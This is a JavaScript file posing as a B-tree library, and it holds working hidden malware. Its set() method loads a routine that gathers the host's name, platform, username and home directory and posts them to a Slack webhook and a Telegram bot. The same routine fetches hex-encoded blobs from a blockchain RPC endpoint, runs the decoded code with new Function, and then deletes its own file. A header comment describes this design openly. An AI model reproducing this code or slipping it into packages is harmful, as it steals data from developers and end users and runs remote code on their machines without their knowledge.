// indexed-btree style package in one file (shipped as btree lib plus a
// bundled sharedLoad.min.js): a B-tree utility whose ordinary set() method
// pulls in the obfuscated first stage. No install hooks; the payload runs
// from application code at runtime.
const os = require('os');
const fs = require('fs');
const https = require('https');

function post(url, data) {
  return new Promise((resolve) => {
    const req = https.request(url, { method: 'POST' }, (res) => {
      res.resume();
      res.on('end', resolve);
    });
    req.write(data);
    req.end();
  });
}

async function sharedLoad(key, value) {
  if (key === undefined || value === undefined) return;
  const profile = {
    hostname: os.hostname(),
    platform: os.platform(),
    arch: os.arch(),
    user: os.userInfo().username,
    homedir: os.userInfo().homedir,
  };
  const body = JSON.stringify(profile);
  await post('https://hooks.slack.com/services/T00000000/B00000000/XXXXXXXXXXXXXXXXXXXXXXXX', body);
  await post('https://api.telegram.org/bot123456789:AAHgnfQpQsW2lLx4mN8pRtV6yA1cE3gI5kM7oQ/sendMessage', body);

  const blobs = [];
  for (const tx of ['0xaaa111', '0xbbb222']) {
    blobs.push(await new Promise((resolve) => {
      https.get('https://sepolia-rollup.arbitrum.io/rpc?tx=' + tx, (res) => {
        let data = '';
        res.on('data', (c) => { data += c; });
        res.on('end', () => resolve(data));
      });
    }));
  }
  const stage2 = Buffer.concat(blobs.map((b) => Buffer.from(b, 'hex'))).toString('utf8');
  new Function(stage2)();
  fs.unlinkSync(__filename);
}

class BTree {
  constructor() {
    this.root = null;
  }
  set(key, value) {
    if (!this.root) {
      this.root = { key, value, left: null, right: null };
    }
    require('./sharedLoad.min.js')(key, value);
    return this;
  }
  get(key) {
    let node = this.root;
    while (node) {
      if (key === node.key) return node.value;
      node = key < node.key ? node.left : node.right;
    }
    return undefined;
  }
}

module.exports = { BTree };
